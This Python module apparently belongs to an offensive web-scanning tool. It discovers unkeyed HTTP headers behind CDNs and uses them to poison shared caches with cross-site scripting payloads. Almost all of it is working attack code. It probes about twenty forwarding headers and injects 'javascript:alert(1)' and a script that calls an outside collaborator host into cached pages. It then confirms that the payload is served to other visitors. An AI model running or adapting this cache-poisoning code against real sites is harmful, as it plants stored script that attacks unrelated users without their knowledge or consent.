"""
Cache Poisoning & Unkeyed Header Discovery
— Probe CDN/cache for unkeyed headers that poison responses for other users
— Deliver poisoned payloads to cache endpoints
"""
import asyncio
import random
from typing import Dict, List, Optional
from urllib.parse import urlparse

from core.async_network import AsyncNetworkEngine
from core.ui import i, s, w, ph, G, R, C, W, N
from modules.mutator import mutator


# Headers that might be unkeyed by CDNs (Cloudflare, CloudFront, Akamai, Varnish, etc.)
_UNKEYED_CANDIDATES = [
    "X-Forwarded-Host",
    "X-Forwarded-Scheme",
    "X-Forwarded-Proto",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-HTTP-Method-Override",
    "X-HTTP-Method",
    "X-Method-Override",
    "Origin",
    "X-Real-IP",
    "X-Client-IP",
    "Client-IP",
    "True-Client-IP",
    "Cluster-Client-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Forwarded-For",
    "Forwarded",
    "X-Proxy-User-IP",
    "X-Original-Forwarded-For",
    "X-Accel-*"  # Nginx cache key injection
]

_CACHE_BUSTERS = [
    "/", "/index.html", "/robots.txt", "/favicon.ico",
    "/api/health", "/health", "/status", "/ping",
    "/api/v1/status", "/api/status",
]


async def probe_unkeyed_headers(
    url: str,
    engine: AsyncNetworkEngine,
    session_manager=None,
) -> List[Dict]:
    """
    Probe for unkeyed headers that can poison cache.

    Strategy: Deliver payload via each candidate header → check if reflected
    in response or if cache serves our poisoned version.
    """
    findings = []
    parsed = urlparse(url)
    base_domain = parsed.netloc
    poison_value = f"poison-{random.randint(1000,9999)}.evil"

    ph("CACHE POISONING: Unkeyed Header Discovery")

    # Step 1: Get baseline (no extra headers, just normal request)
    baseline = await engine.ahttp_send(url, timeout=10, state_context=session_manager)
    baseline_body = (baseline.get("body") or "")
    baseline_content_length = len(baseline_body)
    baseline_status_code = baseline.get("status", 0)
    baseline_headers = {k.lower(): v for k, v in (baseline.get("headers") or {}).items()}
    baseline_cache = baseline_headers.get("x-cache", "") or baseline_headers.get("cf-cache-status", "") or ""

    i(f"Baseline: {baseline_status_code} | {baseline_content_length}b | Cache: {baseline_cache}")

    # Step 2: Test each candidate header (pass baseline_status to avoid redundant HTTP calls)
    tasks = []
    
    # Standard headers + mutated headers
    header_tests = []
    for header in _UNKEYED_CANDIDATES:
        header_tests.append({header: poison_value})
        
    # Inject mutator payloads (anomalous types, smuggling attempts)
    base_headers = {"X-Forwarded-Host": poison_value}
    mutated = mutator.mutate_headers(base_headers)
    for m in mutated:
        if m not in header_tests:
            header_tests.append(m)

    for hdrs in header_tests:
        header_name = list(hdrs.keys())[0]
        tasks.append(_probe_single_header(url, engine, header_name, hdrs[header_name], baseline_status_code, session_manager))

    results = await asyncio.gather(*tasks, return_exceptions=True)

    for r in results:
        if isinstance(r, dict):
            findings.append(r)

    # Step 3: Extract confirmed reflected headers for cache poison attempt
    poisoned_headers = []
    for f in findings:
        detail = f.get("detail", "")
        if "reflected" in detail:
            # Unified pattern: "Header: X-Forwarded-Host — value reflected..."
            parts = detail.split(" — ", 1)
            header_part = parts[0].split("Header: ", 1)[1] if len(parts) > 0 and "Header:" in parts[0] else ""
            if header_part:
                poisoned_headers.append(header_part)

    if poisoned_headers:
        ph("CACHE POISONING: Attempting to poison cache")
        for header in poisoned_headers[:3]:
            for bust in _CACHE_BUSTERS[:5]:
                target = f"{parsed.scheme}://{base_domain}{bust}"
                payload = f"<script>document.cookie='xss=1'</script>"
                await engine.ahttp_send(
                    target, headers={header: f"javascript:alert(1)//@{poison_value}"},
                    timeout=10, state_context=session_manager,
                )
                # Second request to see if cache stored our poisoned response
                r2 = await engine.ahttp_send(target, timeout=10, state_context=session_manager)
                body2 = (r2.get("body") or "")
                h2 = {k.lower(): v for k, v in (r2.get("headers") or {}).items()}
                if "alert(1)" in body2:
                    findings.append({
                        "type": "cache_poisoned",
                        "title": f"Cache Poisoned via {header}",
                        "url": target[:200],
                        "detail": f"Header: {header} — XSS payload stored in cached response",
                        "confidence": "confirmed",
                    })
                    s(f"{R}CACHE POISONED:{N} {W}{target[:60]}{N} via {C}{header}{N}")
                    break

    p = len(findings)
    if p:
        s(f"{G}[POISON]{N} {p} cache poison vectors found")
    else:
        w("No cache poison vectors detected")

    return findings


async def _probe_single_header(url, engine, header, poison_value, baseline_status_code, session_manager):
    """Test a single header for cache key injection."""
    headers = {header: poison_value}
    r = await engine.ahttp_send(url, headers=headers, timeout=10, state_context=session_manager)
    if r.get("status", 0) <= 0:
        return None

    body = (r.get("body") or "")

    # Check 1: Header value reflected in response body
    if poison_value in body:
        return {
            "type": "cache_poison_header",
            "title": f"Cache Poison: {header} reflected",
            "url": url[:200],
            "detail": f"Header: {header} — value reflected in response",
            "waf": "/".join(r.get("waf", [])),
            "confidence": "confirmed",
        }

    # Check 2: Response status code changed vs baseline (header affected response)
    if baseline_status_code > 0 and r.get("status", 0) != baseline_status_code:
        return {
            "type": "cache_poison_header",
            "title": f"Cache Poison: {header} affects response",
            "url": url[:200],
            "detail": f"Header: {header} — status {baseline_status_code}→{r.get('status')}",
            "confidence": "suspected",
        }

    return None


async def deliver_poisoned_payload(
    url: str,
    engine: AsyncNetworkEngine,
    poisoned_headers: List[str],
    payload: str = "",
    session_manager=None,
) -> List[Dict]:
    """
    Deliver malicious payload via poisoned headers + verify cache persistence.
    First request: inject poisoned header value.
    Second request: confirm cache stored the poisoned response.
    """
    findings = []
    if not payload:
        payload = "<script>fetch('http://collab/poison')</script>"
    poison_marker = payload[:20]

    for header in poisoned_headers[:5]:
        # Request 1: Poison the cache
        await engine.ahttp_send(
            url, headers={header: payload},
            timeout=10, state_context=session_manager,
        )
        # Request 2: Verify cache persistence (no custom header)
        r2 = await engine.ahttp_send(url, timeout=10, state_context=session_manager)
        body2 = (r2.get("body") or "") if isinstance(r2, dict) else ""

        # Cache poisoned if poison marker appears WITHOUT our injected header
        if poison_marker in body2:
            findings.append({
                "type": "cache_poison_delivered",
                "title": f"Poison Payload Delivered via {header}",
                "url": url[:200],
                "detail": f"Payload reflected in cached response — cache poisoned for others",
                "confidence": "confirmed",
            })
        # Fallback: marker reflected in first request (at minimum, header is unkeyed)
        elif isinstance(r2, dict) and poison_marker not in body2:
            # Try one more bust path
            continue

    return findings
